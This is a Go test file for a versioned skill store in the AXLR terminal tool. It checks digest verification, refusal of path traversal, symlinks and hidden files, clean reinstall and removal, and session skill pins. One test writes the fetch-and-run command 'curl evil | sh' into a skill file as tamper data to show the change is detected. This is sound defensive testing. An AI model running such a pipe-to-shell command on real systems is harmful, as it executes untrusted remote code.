package storage

import (
	"context"
	"errors"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"
	"time"

	"github.com/underpass-ai/AXLR/tui/application"
	"github.com/underpass-ai/AXLR/tui/domain"
)

// installedSkill is the record and files of one skill version, with the
// digests a staged install computes.
func installedSkill(catalog, name, version string, files map[string]string) (application.InstalledSkill, []application.SkillFile) {
	record := application.InstalledSkill{Catalog: catalog, Name: name, Version: version, Description: "Triage a production incident.", Tools: []string{"local_read"}, Files: map[string]string{}, ManifestSHA256: strings.Repeat("d", 64), BundleSHA256: strings.Repeat("e", 64), IndexGeneratedAt: "2026-10-26T09:00:00Z", InstalledAt: time.Date(2026, 10, 26, 10, 0, 0, 0, time.UTC)}
	var list []application.SkillFile
	for path, content := range files {
		record.Files[path] = hexDigest([]byte(content))
		list = append(list, application.SkillFile{Path: path, Content: []byte(content)})
	}
	return record, list
}

func skillStore(t *testing.T) *CatalogSkillStore {
	t.Helper()
	store, err := NewCatalogSkillStore(filepath.Join(t.TempDir(), "skills"))
	if err != nil {
		t.Fatal(err)
	}
	return store
}

func installSkill(t *testing.T, store *CatalogSkillStore, catalog, name, version string, files map[string]string) (application.InstalledSkill, bool) {
	t.Helper()
	record, list := installedSkill(catalog, name, version, files)
	replaced, err := store.Install(context.Background(), record, list)
	if err != nil {
		t.Fatalf("install %s/%s@%s: %v", catalog, name, version, err)
	}
	return record, replaced
}

// Versions install side by side, owner-only, and list by catalog, name
// and version in numeric order; a read returns the version's own file.
func TestCatalogSkillStoreKeepsVersionsSideBySide(t *testing.T) {
	ctx := context.Background()
	store := skillStore(t)
	if listed, err := store.List(ctx); err != nil || len(listed) != 0 {
		t.Fatalf("empty store lists %+v %v", listed, err)
	}
	installSkill(t, store, "axlr", "incident_triage", "1.9.0", map[string]string{"SKILL.md": "# Triage 1.9\n"})
	installSkill(t, store, "axlr", "incident_triage", "1.10.0", map[string]string{"SKILL.md": "# Triage 1.10\n", "checklist.md": "- logs\n"})
	installSkill(t, store, "acme", "postmortem", "2.0.0", map[string]string{"SKILL.md": "# Postmortem\n"})
	installSkill(t, store, "axlr", "capacity_plan", "1.0.0", map[string]string{"SKILL.md": "# Capacity\n"})
	listed, err := store.List(ctx)
	if err != nil {
		t.Fatal(err)
	}
	var keys []string
	for _, skill := range listed {
		keys = append(keys, skill.Key())
	}
	if got := strings.Join(keys, " "); got != "acme/postmortem@2.0.0 axlr/capacity_plan@1.0.0 axlr/incident_triage@1.9.0 axlr/incident_triage@1.10.0" {
		t.Fatalf("order %s", got)
	}
	if newest := listed[3]; newest.Description != "Triage a production incident." || len(newest.Files) != 2 || newest.BundleSHA256 != strings.Repeat("e", 64) || !newest.InstalledAt.Equal(time.Date(2026, 10, 26, 10, 0, 0, 0, time.UTC)) {
		t.Fatalf("record %+v", newest)
	}
	for version, want := range map[string]string{"1.9.0": "# Triage 1.9\n", "1.10.0": "# Triage 1.10\n"} {
		data, err := store.Read(ctx, "axlr", "incident_triage", version, "SKILL.md")
		if err != nil || string(data) != want {
			t.Fatalf("%s: %q %v", version, data, err)
		}
	}
	if runtime.GOOS != "windows" {
		for _, path := range []string{store.Dir, filepath.Join(store.Dir, "axlr", "incident_triage", "1.10.0")} {
			info, err := os.Stat(path)
			if err != nil || info.Mode().Perm() != 0o700 {
				t.Fatalf("%s: %v %v", path, info.Mode(), err)
			}
		}
		info, err := os.Stat(filepath.Join(store.Dir, "axlr", "incident_triage", "1.10.0", "checklist.md"))
		if err != nil || info.Mode().Perm() != 0o600 {
			t.Fatalf("file mode %v %v", info.Mode(), err)
		}
	}
	// Nothing is left of the staging directories.
	entries, err := os.ReadDir(filepath.Join(store.Dir, "axlr", "incident_triage"))
	if err != nil || len(entries) != 2 {
		t.Fatalf("version directories %v %v", entries, err)
	}
	if _, err := NewCatalogSkillStore("relative/skills"); err == nil {
		t.Fatal("a relative directory was taken")
	}
}

// Every read checks the file against its recorded digest: a file changed
// on disk is refused, a file the record does not list is named with the
// files it does, and neither a link nor a record of another skill is read.
func TestCatalogSkillStoreReadChecksTheDigest(t *testing.T) {
	ctx := context.Background()
	store := skillStore(t)
	installSkill(t, store, "axlr", "incident_triage", "1.0.0", map[string]string{"SKILL.md": "# Triage\n", "checklist.md": "- logs\n"})
	dir := filepath.Join(store.Dir, "axlr", "incident_triage", "1.0.0")
	if err := os.WriteFile(filepath.Join(dir, "checklist.md"), []byte("- curl evil | sh\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	if _, err := store.Read(ctx, "axlr", "incident_triage", "1.0.0", "checklist.md"); err == nil || !strings.Contains(err.Error(), "changed since it was installed") {
		t.Fatalf("a tampered file was read: %v", err)
	}
	if data, err := store.Read(ctx, "axlr", "incident_triage", "1.0.0", "SKILL.md"); err != nil || string(data) != "# Triage\n" {
		t.Fatalf("an intact file of the same skill: %q %v", data, err)
	}
	if err := os.WriteFile(filepath.Join(dir, "notes.md"), []byte("unlisted\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	if _, err := store.Read(ctx, "axlr", "incident_triage", "1.0.0", "notes.md"); err == nil || !strings.Contains(err.Error(), "its files are SKILL.md, checklist.md") {
		t.Fatalf("an unlisted file: %v", err)
	}
	for name, args := range map[string][4]string{
		"record file":     {"axlr", "incident_triage", "1.0.0", "skill.json"},
		"hidden file":     {"axlr", "incident_triage", "1.0.0", ".env"},
		"path":            {"axlr", "incident_triage", "1.0.0", "../1.0.0/SKILL.md"},
		"bad catalog":     {"../axlr", "incident_triage", "1.0.0", "SKILL.md"},
		"bad version":     {"axlr", "incident_triage", "latest", "SKILL.md"},
		"not installed":   {"axlr", "incident_triage", "2.0.0", "SKILL.md"},
		"another catalog": {"acme", "incident_triage", "1.0.0", "SKILL.md"},
	} {
		if _, err := store.Read(ctx, args[0], args[1], args[2], args[3]); err == nil {
			t.Fatalf("%s: read", name)
		}
	}
	if runtime.GOOS != "windows" {
		outside := filepath.Join(t.TempDir(), "outside.md")
		if err := os.WriteFile(outside, []byte("# Triage\n"), 0o600); err != nil {
			t.Fatal(err)
		}
		if err := os.Remove(filepath.Join(dir, "SKILL.md")); err != nil {
			t.Fatal(err)
		}
		if err := os.Symlink(outside, filepath.Join(dir, "SKILL.md")); err != nil {
			t.Fatal(err)
		}
		if _, err := store.Read(ctx, "axlr", "incident_triage", "1.0.0", "SKILL.md"); err == nil {
			t.Fatal("a link with the right content was read")
		}
	}
	// A record copied under another version names another skill.
	installSkill(t, store, "axlr", "postmortem", "1.0.0", map[string]string{"SKILL.md": "# Postmortem\n"})
	record, err := os.ReadFile(filepath.Join(store.Dir, "axlr", "postmortem", "1.0.0", "skill.json"))
	if err != nil {
		t.Fatal(err)
	}
	moved := filepath.Join(store.Dir, "axlr", "postmortem", "1.1.0")
	if err := os.MkdirAll(moved, 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(moved, "skill.json"), record, 0o600); err != nil {
		t.Fatal(err)
	}
	if _, err := store.List(ctx); err == nil || !strings.Contains(err.Error(), "names another skill") {
		t.Fatalf("a record of another version was listed: %v", err)
	}
}

// Installing a version again replaces it whole and says so; a record and
// files that disagree are refused before anything is written.
func TestCatalogSkillStoreReinstallReplaces(t *testing.T) {
	ctx := context.Background()
	store := skillStore(t)
	if _, replaced := installSkill(t, store, "axlr", "incident_triage", "1.0.0", map[string]string{"SKILL.md": "# One\n", "old.md": "old\n"}); replaced {
		t.Fatal("a first install reported a replacement")
	}
	if _, replaced := installSkill(t, store, "axlr", "incident_triage", "1.0.0", map[string]string{"SKILL.md": "# Two\n"}); !replaced {
		t.Fatal("a reinstall did not report the replacement")
	}
	if data, err := store.Read(ctx, "axlr", "incident_triage", "1.0.0", "SKILL.md"); err != nil || string(data) != "# Two\n" {
		t.Fatalf("%q %v", data, err)
	}
	if _, err := os.Stat(filepath.Join(store.Dir, "axlr", "incident_triage", "1.0.0", "old.md")); !os.IsNotExist(err) {
		t.Fatalf("a file of the replaced install stayed: %v", err)
	}
	entries, _ := os.ReadDir(filepath.Join(store.Dir, "axlr", "incident_triage"))
	if len(entries) != 1 {
		t.Fatalf("leftovers beside the version: %v", entries)
	}
	record, files := installedSkill("axlr", "incident_triage", "1.1.0", map[string]string{"SKILL.md": "# Three\n"})
	for name, tc := range map[string]struct {
		record application.InstalledSkill
		files  []application.SkillFile
	}{
		"content differs": {record, []application.SkillFile{{Path: "SKILL.md", Content: []byte("# Other\n")}}},
		"file unlisted":   {record, []application.SkillFile{{Path: "other.md", Content: []byte("# Three\n")}}},
		"no file":         {record, nil},
		"no version":      {func() application.InstalledSkill { r := record; r.Version = ""; return r }(), files},
		"bad name":        {func() application.InstalledSkill { r := record; r.Name = "Incident"; return r }(), files},
		"record name":     {record, []application.SkillFile{{Path: "skill.json", Content: []byte("# Three\n")}}},
	} {
		if _, err := store.Install(ctx, tc.record, tc.files); err == nil {
			t.Fatalf("%s: installed", name)
		}
	}
	if _, err := os.Stat(filepath.Join(store.Dir, "axlr", "incident_triage", "1.1.0")); !os.IsNotExist(err) {
		t.Fatalf("a refused install left a version: %v", err)
	}
}

// Remove takes one version, or every version of the name, and says what
// it removed; the name's directory goes with its last version.
func TestCatalogSkillStoreRemove(t *testing.T) {
	ctx := context.Background()
	store := skillStore(t)
	installSkill(t, store, "axlr", "incident_triage", "1.0.0", map[string]string{"SKILL.md": "# One\n"})
	installSkill(t, store, "axlr", "incident_triage", "1.1.0", map[string]string{"SKILL.md": "# Two\n"})
	installSkill(t, store, "axlr", "incident_triage", "2.0.0", map[string]string{"SKILL.md": "# Three\n"})
	installSkill(t, store, "acme", "incident_triage", "1.0.0", map[string]string{"SKILL.md": "# Acme\n"})
	removed, err := store.Remove(ctx, "axlr", "incident_triage", "1.1.0")
	if err != nil || len(removed) != 1 || removed[0].Key() != "axlr/incident_triage@1.1.0" {
		t.Fatalf("%+v %v", removed, err)
	}
	if _, err := store.Read(ctx, "axlr", "incident_triage", "1.1.0", "SKILL.md"); err == nil {
		t.Fatal("a removed version was read")
	}
	if _, err := store.Remove(ctx, "axlr", "incident_triage", "1.1.0"); err == nil || !strings.Contains(err.Error(), "not installed") {
		t.Fatalf("removed twice: %v", err)
	}
	removed, err = store.Remove(ctx, "axlr", "incident_triage", "")
	if err != nil || len(removed) != 2 || removed[0].Version != "1.0.0" || removed[1].Version != "2.0.0" {
		t.Fatalf("%+v %v", removed, err)
	}
	if _, err := os.Stat(filepath.Join(store.Dir, "axlr", "incident_triage")); !os.IsNotExist(err) {
		t.Fatalf("the name's directory stayed: %v", err)
	}
	if listed, err := store.List(ctx); err != nil || len(listed) != 1 || listed[0].Key() != "acme/incident_triage@1.0.0" {
		t.Fatalf("another catalog's install was touched: %+v %v", listed, err)
	}
	for name, args := range map[string][3]string{
		"unknown name":    {"axlr", "postmortem", ""},
		"unknown catalog": {"other", "incident_triage", ""},
		"bad version":     {"acme", "incident_triage", "1"},
		"bad catalog":     {"..", "incident_triage", ""},
	} {
		if _, err := store.Remove(ctx, args[0], args[1], args[2]); err == nil {
			t.Fatalf("%s: removed", name)
		}
	}
}

// SkillSources reads the flat files of .axlr/skills/<name>/; a missing
// directory is ErrNoSkillSource, and a subdirectory, a link or an
// oversized file refuses the skill.
func TestSkillSourcesReadsFlatFiles(t *testing.T) {
	ctx := context.Background()
	workspace := t.TempDir()
	dir := filepath.Join(workspace, ".axlr", "skills", "incident_triage")
	if err := os.MkdirAll(dir, 0o700); err != nil {
		t.Fatal(err)
	}
	for name, content := range map[string]string{"SKILL.md": "# Triage\n", "checklist.md": "- logs\n", "catalog.json": `{"version":"1.0.0"}`} {
		if err := os.WriteFile(filepath.Join(dir, name), []byte(content), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	files, err := SkillSources{}.ReadSkillSource(ctx, workspace, "incident_triage")
	if err != nil || len(files) != 3 || string(files["SKILL.md"]) != "# Triage\n" || string(files["catalog.json"]) != `{"version":"1.0.0"}` {
		t.Fatalf("%v %v", files, err)
	}
	if _, err := (SkillSources{}).ReadSkillSource(ctx, workspace, "postmortem"); !errors.Is(err, application.ErrNoSkillSource) {
		t.Fatalf("a missing directory: %v", err)
	}
	for name, args := range map[string][2]string{
		"relative workspace": {"relative", "incident_triage"},
		"bad name":           {workspace, "../incident_triage"},
		"name with dash":     {workspace, "incident-triage"},
	} {
		if _, err := (SkillSources{}).ReadSkillSource(ctx, args[0], args[1]); err == nil {
			t.Fatalf("%s: read", name)
		}
	}
	if err := os.WriteFile(filepath.Join(dir, "big.md"), []byte(strings.Repeat("x", application.MaxSkillFileBytes+1)), 0o600); err != nil {
		t.Fatal(err)
	}
	if _, err := (SkillSources{}).ReadSkillSource(ctx, workspace, "incident_triage"); err == nil || !strings.Contains(err.Error(), "256 KiB") {
		t.Fatalf("an oversized file: %v", err)
	}
	if err := os.Remove(filepath.Join(dir, "big.md")); err != nil {
		t.Fatal(err)
	}
	if err := os.Mkdir(filepath.Join(dir, "references"), 0o700); err != nil {
		t.Fatal(err)
	}
	if _, err := (SkillSources{}).ReadSkillSource(ctx, workspace, "incident_triage"); err == nil || !strings.Contains(err.Error(), "not a regular file") {
		t.Fatalf("a subdirectory: %v", err)
	}
	if err := os.Remove(filepath.Join(dir, "references")); err != nil {
		t.Fatal(err)
	}
	if runtime.GOOS == "windows" {
		return
	}
	secret := filepath.Join(t.TempDir(), "secret.md")
	if err := os.WriteFile(secret, []byte("secret\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(secret, filepath.Join(dir, "linked.md")); err != nil {
		t.Fatal(err)
	}
	if _, err := (SkillSources{}).ReadSkillSource(ctx, workspace, "incident_triage"); err == nil || !strings.Contains(err.Error(), "not a regular file") {
		t.Fatalf("a link: %v", err)
	}
	// A skill directory that is itself a link out of the workspace is not
	// read through.
	outside := t.TempDir()
	if err := os.WriteFile(filepath.Join(outside, "SKILL.md"), []byte("# Outside\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(outside, filepath.Join(workspace, ".axlr", "skills", "escaped")); err != nil {
		t.Fatal(err)
	}
	if files, err := (SkillSources{}).ReadSkillSource(ctx, workspace, "escaped"); err == nil {
		t.Fatalf("read through a link out of the workspace: %v", files)
	}
}

// The session's pins are kept in its execution file: pins come back with
// their catalog and bundle digest, an empty pin list stays a pin (no
// catalog skill) and is written as such, and no pins writes nothing; a
// stored pin list that does not validate refuses the session.
func TestSessionStoreKeepsThePinnedSkills(t *testing.T) {
	ctx := context.Background()
	store, dir := openStore(t)
	id := domain.SessionID("0123456789abcdef0123456789abcdef")
	path := filepath.Join(dir, string(id)+".execution")
	session, err := domain.NewSession(id, domain.Workspace(t.TempDir()), "test/model")
	if err != nil {
		t.Fatal(err)
	}
	pins := domain.ExecutionSkills{Pins: []domain.SkillPin{{Catalog: "axlr", Name: "incident_triage", Version: "1.0.0", BundleSHA256: strings.Repeat("a", 64)}, {Catalog: "acme", Name: "postmortem", Version: "2.1.0", BundleSHA256: strings.Repeat("b", 64)}}}
	if err := session.SetSkills(pins); err != nil {
		t.Fatal(err)
	}
	if err := store.Save(ctx, session); err != nil {
		t.Fatal(err)
	}
	loaded, err := store.Load(ctx, id)
	if err != nil {
		t.Fatal(err)
	}
	kept, has := loaded.Skills()
	if !has || len(kept.Pins) != 2 || kept.Pins[0] != pins.Pins[0] || kept.Pins[1] != pins.Pins[1] {
		t.Fatalf("%+v %v", kept, has)
	}
	if err := loaded.SetSkills(domain.ExecutionSkills{}); err != nil {
		t.Fatal(err)
	}
	if err := store.Save(ctx, loaded); err != nil {
		t.Fatal(err)
	}
	raw, err := os.ReadFile(path)
	if err != nil || !strings.Contains(string(raw), `"skills":[]`) {
		t.Fatalf("no pin was not written as an empty list: %s %v", raw, err)
	}
	empty, err := store.Load(ctx, id)
	if err != nil {
		t.Fatal(err)
	}
	if kept, has := empty.Skills(); !has || len(kept.Pins) != 0 {
		t.Fatalf("no pin came back as %+v %v", kept, has)
	}
	empty.ClearSkills()
	if err := store.Save(ctx, empty); err != nil {
		t.Fatal(err)
	}
	if _, err := os.Stat(path); !os.IsNotExist(err) {
		t.Fatalf("the execution file stays without pins: %v", err)
	}
	again, err := store.Load(ctx, id)
	if err != nil {
		t.Fatal(err)
	}
	if _, has := again.Skills(); has {
		t.Fatal("cleared pins came back")
	}
	for name, raw := range map[string]string{
		"no digest":     `{"version":1,"skills":[{"name":"incident_triage","version":"1.0.0","catalog":"axlr"}]}`,
		"no catalog":    `{"version":1,"skills":[{"name":"incident_triage","version":"1.0.0","bundle_sha256":"` + strings.Repeat("a", 64) + `"}]}`,
		"unknown field": `{"version":1,"skills":[{"name":"incident_triage","version":"1.0.0","catalog":"axlr","bundle_sha256":"` + strings.Repeat("a", 64) + `","latest":true}]}`,
		"not a list":    `{"version":1,"skills":{"name":"incident_triage"}}`,
	} {
		if err := os.WriteFile(path, []byte(raw), 0o600); err != nil {
			t.Fatal(err)
		}
		if _, err := store.Load(ctx, id); err == nil {
			t.Fatalf("%s: a session with unreadable pins loaded", name)
		}
	}
	if err := os.Remove(path); err != nil {
		t.Fatal(err)
	}
}
